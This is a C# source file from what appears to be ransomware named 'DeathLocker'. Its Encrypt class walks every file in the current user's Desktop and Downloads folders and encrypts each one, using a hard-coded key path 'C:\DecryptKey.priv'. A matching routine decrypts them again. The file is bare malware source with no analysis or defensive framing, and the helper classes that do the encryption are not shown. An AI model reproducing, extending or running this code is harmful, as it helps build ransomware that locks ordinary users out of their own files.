using System;
using System.IO;

namespace DeathLocker;

internal class Encrypt
{
	public void EncryptTool()
	{
		EncryptionFile encryptionFile = new EncryptionFile();
		string password = "C:\\DecryptKey.priv";
		string[] files = Directory.GetFiles("C:\\Users\\" + Environment.UserName + "\\Desktop", "*.*", SearchOption.AllDirectories);
		string[] array = files;
		foreach (string file in array)
		{
			encryptionFile.EncryptFile(file, password);
		}
		string[] files2 = Directory.GetFiles("C:\\Users\\" + Environment.UserName + "\\Downloads", "*.*", SearchOption.AllDirectories);
		string[] array2 = files2;
		foreach (string file2 in array2)
		{
			encryptionFile.EncryptFile(file2, password);
		}
	}

	public void DecryptTool()
	{
		DecryptionFile decryptionFile = new DecryptionFile();
		string password = "C:\\DecryptKey.priv";
		string[] files = Directory.GetFiles("C:\\Users\\" + Environment.UserName + "\\Desktop", "*.*", SearchOption.AllDirectories);
		string[] array = files;
		foreach (string fileEncrypted in array)
		{
			decryptionFile.DecryptFile(fileEncrypted, password);
		}
		string[] files2 = Directory.GetFiles("C:\\Users\\" + Environment.UserName + "\\Downloads", "*.*", SearchOption.AllDirectories);
		string[] array2 = files2;
		foreach (string fileEncrypted2 in array2)
		{
			decryptionFile.DecryptFile(fileEncrypted2, password);
		}
	}
}
